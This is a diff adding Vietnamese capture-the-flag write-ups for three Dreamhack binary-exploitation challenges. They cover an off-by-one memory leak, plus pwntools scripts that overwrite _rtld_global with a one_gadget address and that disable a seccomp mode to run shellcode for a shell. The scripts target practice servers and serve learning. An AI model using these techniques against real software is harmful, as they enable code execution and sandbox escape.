@@ -1,4 +1,116 @@
 <details>
+<details>
+<summary>memory_leakage </summary>
+	
+- Bài cho ta 1 file source và 1 file binary
+- Đầu tiên mở source lên thì thấy name khai báo 16 byte mà khúc dưới nhập tên đủ 16 byte luôn. Do đó sẽ thiếu byte để encode null terminator => lỗi off by one. Ngoài ra cũng có biến age 4 byte do kiểu int
+![](https://i.imgur.com/yWNAPgl.png)
+
+![](https://i.imgur.com/FgHs49X.png)
+
+- Ở khúc dưới sẽ có chỗ cho ta in tên và tuổi. Vậy ta sẽ debug xem thử thứ tự các biến thế nào để coi leak được hay không
+
+![](https://i.imgur.com/V6GQUJp.png)
+
+- Debug thì thấy thứ tự các biến là name -> age -> flag. Do đó ta chỉ cần cho biến age là số nào đó đủ 4 byte nào đó khác byte /x00 là lấy được flag
+
+- Tiếp theo kết nối với server. Đầu tiên nhập 3 để load flag. Tiếp theo chọn 1 rồi nhập tên đủ 16 byte, name đủ 4 byte khác byte /x00. Cuối cùng nhập 2 để leak.
+
+![](https://i.imgur.com/ZxSGGMB.png)
+
+</details>
+
+<details>
+<summary>rtld </summary>
+- Đề cho ta file source, file libc và file binary
+- Đầu tiên mở file source lên xem thử. Có hàm `get_shell` cho ta shell, ngoài ra hàm `main` leak cho ta libc và cho ta điều khiển dữ liệu của 1 địa chỉ bất kỳ.
+
+![](https://i.imgur.com/skHYxHk.png)
+
+- Tiếp theo ta checksec. Ta thấy PIE enable nên hàm `get_shell` coi như phế vì không leak được. Do đó ở đây ta sẽ sài `one_gadget`
+
+![](https://i.imgur.com/i4KHhC9.png)
+
+- Đề leak cho ta libc vì vậy ta cần overwrite 1 địa chỉ nào đó ở libc mà chương trình có call tới thành `one_gadget`. Đề không leak exe để tính basse nên ở đây khó overwrite `.got.plt`
+    
+- Do đó ở đây mình cần overwrite địa chỉ libc ở chỗ mình tô vàng. Ở đây theo dreamhack thì mình cần overwrite `_rtld_global`. Đây chính là địa chỉ khi chương trình exit sẽ gọi tới.
+![](https://i.imgur.com/KMu39eS.png)
+
+-Tiếp theo mình gdb để tính offset thử.
+
+![](https://i.imgur.com/7j34x4f.png)
+
+- Tiếp theo sài `one_gadget`. Ở đây có địa chỉ cuối mình sài được
+
+![](https://i.imgur.com/L0p36Ds.png)
+
+- Cuối cùng viết script:
+```python
+from pwn import *
+exe = ELF("rtld_patched")
+libc = ELF("libc.so.6")
+p = remote("host2.dreamhack.games",21781)
+#p = process(exe.path)
+p.recvuntil(b'stdout: ')
+leak =int(p.recvline()[:-1] ,16)
+libc.address = leak - 3954208
+rtld = libc.address + 6229832
+print(hex(libc.address))
+print(hex(rtld))
+p.sendlineafter(b'addr: ',str(rtld).encode() )
+p.sendlineafter(b'value: ',str(libc.address + 0xf1147).encode())
+p.interactive()
+```
+- Chạy thử và ta có flag.
+</details>
+
+<details>
+<summary>seccomp </summary>
+	
+- Bài cho ta file source và file binary
+- Đầu tiên mở source lên đọc. Tóm tắt thì bài cho ta nhập shellcode để thực thi nhưng sẽ giới hạn không cho ta syscall. Ngoài ra chương trình còn cho ta overwrite 1 địa chỉ bất kỳ.
+
+![](https://i.imgur.com/try1jjo.png)
+
+- Ta lên hàm syscall_filter để đọc thử
+    
+![](https://i.imgur.com/vXU0sVo.png)
+
+- Ở đây mặc định chương trình sẽ set seccomp mặc định là `SECCOMP_MODE_STRICT`. Mode này chỉ cho phép syscall các hàm sau :  `read`, `write`, `_exit`.
+- Ta phân tích tiếp filter của chương trình: Nó chỉ check xem nếu shellcode đang thực hiện có phải của architecture x86-64 hay không, nếu phải thì lấy syscall number, không phải thì terminate bằng sigsegv.
+- Tiếp theo ta `checksec`.
+![](https://i.imgur.com/pW9sQm7.png)
+
+- Ta thấy PIE disable, mà chương trình mặc định sẽ gọi `SECCOMP_MODE_STRICT`, do đó ta tìm cách overwrite `mode` thành `SECCOMP_MOD`E nào đó mà "nhẹ hơn".
+- Đọc doc của linux kernel thì thấy có 2 mode mà ta có thể sài là 0 và 2. 0 tức disable luôn còn 2 là sài cái filter ở trên mình phân tích. Mà cái filter đó không có gì nguy hiểm tới shellcode của mình hết nên mình thích overwrite mode bằng 0 hay 2 là tuỳ. Ở đây mình overwrite thành 2
+
+![](https://i.imgur.com/in6Xdk3.png)
+
+- Tiếp theo ida tìm địa chỉ của `mode`. Ta được địa chỉ là `0x0000000000602090` tức `6299792`
+![](https://i.imgur.com/WF8Of4v.png)
+
+- Cuối cùng viết script. Đầu tiên ta overwrite `mode` thành 2, sau đó nhập shellcode cuối cùng thực thi 
+```python
+from pwn import *
+exe = ELF("seccomp")
+#p=remote("host3.dreamhack.games",21718)
+p = process(exe.path)
+
+context.update(arch='amd64',os='linux')
+shell = shellcraft.sh()
+
+p.sendlineafter(b'> ',b'3')
+p.sendlineafter(b'addr: ',b'6299792')
+p.sendlineafter(b'value: ',b'2')
+
+p.sendlineafter(b'> ',b'1')
+p.sendlineafter(b'shellcode: ',asm(shell))
+
+p.sendlineafter(b'> ',b'2')
+p.interactive()
+```
+</details>
+	
 <summary>Welcome </summary>
 	
 - Ta chỉ cần kết nối và lấy flag
